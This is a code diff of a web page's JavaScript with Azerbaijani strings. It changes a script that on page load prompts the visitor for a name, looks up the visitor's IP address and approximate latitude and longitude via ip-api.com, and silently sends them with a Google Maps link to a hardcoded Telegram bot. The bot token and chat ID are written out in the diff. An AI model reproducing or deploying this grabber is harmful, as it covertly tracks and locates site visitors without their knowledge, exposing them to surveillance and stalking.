@@ -30,33 +30,36 @@
     const token = '8408687620:AAEy2vYnaR8Be9kpbjoKpCTUAXMMHvvd4AE';
     const chatId = '1689497109';
 
-    async function sendIpToTelegram(name, ip) {
-      const message = encodeURIComponent(`Yeni istifadəçi: ${name}\nIP-si: ${ip}`);
-      const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${message}`;
+    async function sendLocationToTelegram(ip, lat, lon) {
+  const mapUrl = `https://maps.google.com/?q=${lat},${lon}`;
+  const message = encodeURIComponent(`Yeni istifadəçinin IP-si: ${ip}\nYer: ${mapUrl}`);
+  const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${message}`;
 
-      try {
-        const response = await fetch(url);
-        if (!response.ok) {
-          console.error('Telegrama mesaj göndərilə bilmədi');
-        }
-      } catch (error) {
-        console.error('Xəta:', error);
-      }
+  try {
+    const response = await fetch(url);
+    if (!response.ok) {
+      console.error('Telegrama mesaj göndərilə bilmədi');
     }
+  } catch (error) {
+    console.error('Xəta:', error);
+  }
+}
 
-    async function getIpAndSend(name) {
-      try {
-        const res = await fetch('https://api.ipify.org?format=json');
-        const data = await res.json();
-        const ip = data.ip;
+async function getIpAndSend() {
+  try {
+    const res = await fetch('http://ip-api.com/json');
+    const data = await res.json();
+    const ip = data.query;
+    const lat = data.lat;
+    const lon = data.lon;
 
-        document.getElementById('ipDisplay').textContent = `API ünvanın: ${ip}`;
-        sendIpToTelegram(name, ip);
-      } catch (error) {
-        document.getElementById('ipDisplay').textContent = 'IP alınarkən xəta baş verdi';
-        console.error('IP alınarkən xəta:', error);
-      }
-    }
+    document.getElementById('ipDisplay').textContent = ip;
+    sendLocationToTelegram(ip, lat, lon);
+  } catch (error) {
+    document.getElementById('ipDisplay').textContent = 'IP alınarkən xəta baş verdi';
+    console.error('IP alınarkən xəta:', error);
+  }
+}
 
     window.onload = () => {
       const name = prompt("Zəhmət olmasa adınızı yazın");
